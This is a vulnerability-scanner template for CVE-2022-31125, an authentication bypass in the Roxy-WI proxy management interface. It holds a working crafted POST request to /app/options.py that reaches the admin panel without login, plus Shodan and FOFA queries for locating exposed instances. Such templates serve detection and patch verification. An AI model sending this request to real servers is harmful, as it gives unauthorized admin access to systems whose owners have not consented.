id: CVE-2022-31125

info:
  name: Roxy-WI Improper Authentication Control
  author: ProjectDiscoveryAI
  severity: critical
  description: Roxy-wi is an open source web interface for managing Haproxy, Nginx, Apache and Keepalived servers. A vulnerability in Roxy-wi allows a remote, unauthenticated attacker to bypass authentication and access admin functionality by sending a specially crafted HTTP request. This affects Roxywi versions before 6.1.1.0.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Implement proper authentication controls such as multi-factor authentication and strong password policies.
  reference:
    - http://packetstormsecurity.com/files/171648/Roxy-WI-6.1.0.0-Improper-Authentication-Control.html
    - https://github.com/hap-wi/roxy-wi/security/advisories/GHSA-hr76-3hxp-5mm3
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L
    cvss-score: 10
    cve-id: CVE-2022-31125
    cwe-id: CWE-287
    epss-score: 0.02959
    epss-percentile: 0.91217
    cpe: cpe:2.3:a:roxy-wi:roxy-wi:*:*:*:*:*:*:*:*
  metadata:
    vendor: roxy-wi
    product: roxy-wi
    shodan-query: http.html:"Roxy-WI"
    fofa-query: body="roxy-wi"

http:
  - method: POST
    path:
      - "{{BaseURL}}/app/options.py"

    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
      Accept: "*/*"
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest
      Origin: "{{BaseURL}}"
      Dnt: "1"
      Referer: "{{BaseURL}}/app/login.py"
      Sec-Fetch-Dest: empty
      Sec-Fetch-Mode: cors
      Sec-Fetch-Site: same-origin
      Te: trailers
      Connection: close

    body: |
      alert_consumer=notNull&serv=roxy-wi.access.log&rows1=10&grep=&exgrep=&hour=00&minut=00&hour1=23&minut1=45
    matchers:
      - type: word
        words:
          - "Admin Panel"
        part: body
